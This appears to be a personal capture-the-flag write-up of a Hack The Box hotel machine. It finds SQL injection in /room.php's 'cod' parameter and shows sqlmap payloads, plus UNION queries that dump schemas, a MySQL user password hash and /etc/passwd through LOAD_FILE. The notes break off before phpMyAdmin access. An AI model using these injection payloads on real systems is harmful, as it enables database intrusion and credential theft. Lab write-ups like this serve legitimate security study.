![[Pasted image 20230503230940.png]]

Email address: `supersecurehotel@logger.htb`

## Rooms
![[Pasted image 20230503231045.png]]
Inputing an invalid object id to `/room.php` returns a blank template. The booking link does nothing on all objects, whether valid or not:
![[Pasted image 20230503231215.png]]

## Strange response header
![[Pasted image 20230503232557.png]]

I could potentially be blocked at any point. Not really important tho.

![[Pasted image 20230503233506.png]]
![[Pasted image 20230503233547.png]]
`phpmyadmin v4.8` appears to be available.
![[Pasted image 20230503233914.png]]

However, there seems to be no unauthenticated vulnerabilities here. This does proabably confirm that the site is using MySQL however. I can check back at the direct object referencing to see if it's SQL injectable.

![[Pasted image 20230503234450.png]]
Indeed, this indicates that it's using SQL to find rooms.

## sqlmap
```
---  
Parameter: cod (GET)  
   Type: boolean-based blind  
   Title: AND boolean-based blind - WHERE or HAVING clause  
   Payload: cod=1 AND 6035=6035  
  
   Type: time-based blind  
   Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  
   Payload: cod=1 AND (SELECT 8105 FROM (SELECT(SLEEP(5)))ojvv)  
  
   Type: UNION query  
   Title: Generic UNION query (NULL) - 7 columns  
   Payload: cod=-8109 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6a6271,0x516a4b4d6849575159697967544f6d4b4154586e66694c4a77535650424a5343456861496f637273,0x7162717871),NULL,NULL,NULL-- -  
---
```

The report says there are 7 columns. I can start testing this manually for which field is displays in which column.

![[Pasted image 20230504000323.png]]
It appears to be column 5 that leaks information, however, the report says that #4 can also be used.

![[Pasted image 20230504000608.png]]
Indeed it can be... as well as 2 and 3.

![[Pasted image 20230504013115.png]]
```
user():DBadmin@localhost
database():hotel

select 1,group_concat(schema_name),3,4,5,6,7 from information_schema.schemata:
hotel,information_schema,mysql,performance_schema

select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='hotel':
room

select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='room':
cod,name,price,descrip,star,image,mini

column_stats,
columns_priv,
db,event,
func,
...
user

group_concat(column_name) from information_schema.columns where table_name='user':

Host,
User,
Password,
Select_priv,
Insert_priv,
Update_priv,
Delete_priv,
Create_priv,
Drop_priv,
...

select 1,User,3,4,Password,6,7 from mysql.user:
DBadmin
*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0

LOAD_FILE("/etc/passwd"):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin

```

With a password, we can proceed to phpMyAdmin




